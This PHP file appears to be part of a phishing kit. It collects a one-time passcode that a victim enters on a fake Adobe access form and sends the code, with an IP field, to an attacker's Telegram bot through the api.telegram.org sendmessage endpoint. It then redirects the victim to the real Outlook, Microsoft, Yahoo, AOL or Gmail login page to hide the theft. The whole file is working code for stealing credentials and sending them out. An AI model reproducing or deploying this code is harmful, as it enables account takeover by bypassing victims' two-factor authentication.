<?php
include 'telegram.php';
session_start();
$Id = $_SESSION['id'];

 if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $otp = $_POST['txtotp'];


    // Compose a simple HTML email message
    $message = "[+]━━【】━━[+]\n";
    $message .= "You have a new website form submission:\n";
    $message .= "IP Address:     ".$ip."\n";
    $message .= "Adobe Access Information:\n";
    $message .= "OTP:      ".$otp."\n";
   
    
    
       
    $mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    // $response = curl_exec($curl);
	$response = curl_exec($curl);
    
    if ($response) {

        if ($Id == 1) {
            header("Location: https://outlook.com/login");
          } else if ($Id == 2) {
            header("Location: https://login.microsoftonline.com");
          } else if ($Id == 3) {
            header("Location: https://yahoo.com/login");
          } else if ($Id == 4) {
            header("Location: https://aol.com/login");
          } else if ($Id == 5) {
            header("Location: https://gmail.com/login");
          }
        exit();
    } else {
        echo 'Failed to send message.';
    }
   
    // $response = array(
    //     'status' => 'success',
    //     'message' => 'Id: ' .$name. ', otp: ' . $otp
    // );

    curl_close($curl);
    // Set the content type header to JSON
    header('Content-Type: application/json');

    // Send the JSON response
    echo json_encode($response);

 }



?>

